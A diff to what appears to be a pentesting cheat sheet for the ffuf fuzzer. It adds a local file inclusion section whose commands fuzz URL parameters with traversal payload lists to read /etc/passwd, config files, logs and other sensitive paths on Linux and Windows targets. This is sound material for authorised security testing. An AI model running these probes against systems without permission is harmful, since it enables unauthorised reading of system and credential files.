@@ -52,7 +52,7 @@ EXAMPLE USAGE:
     - Quick: `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
     - Comprehensive: `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
 
-## Example Commands
+## Commands
 
 ### Find file extension
 
@@ -126,4 +126,32 @@ ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZ -u http:/
 ```bash
 # Access via curl (POST)
 curl http://<TARGET>/<PAGE> -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d '<PARAM>=<VALUE>'
+```
+
+## LFI
+
+Fuzzes a parameter with hundreds of `/etc/passwd` traversal permutations including encoding bypasses, null bytes, and double encoding. First identify the vulnerable parameter by testing pages that load dynamic content (e.g. `?page=`, `?file=`, `?lang=`, `?view=`), then look for parameters whose value matches a filename or path.
+
+### Linux
+
+```bash
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=FUZZ' -fs 0
+```
+
+Once confirmed, fuzz for accessible config files, logs, and sensitive paths:
+
+```bash
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows_by-1N3@CrowdShield.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=<LFI_TRAVERSAL>FUZZ' -fs 0 -v
+```
+
+### Windows
+
+```bash
+ffuf -w /usr/share/seclists/Fuzzing/LFI/Windows/Windows-LFI-Payloads_by-adeadfed.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=FUZZ' -fs 0
+```
+
+Once confirmed, fuzz for accessible config files, logs, and sensitive paths:
+
+```bash
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-linux-and-windows-LFI-files.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAMETER>=<LFI_TRAVERSAL>FUZZ' -fs 0 -v
 ```
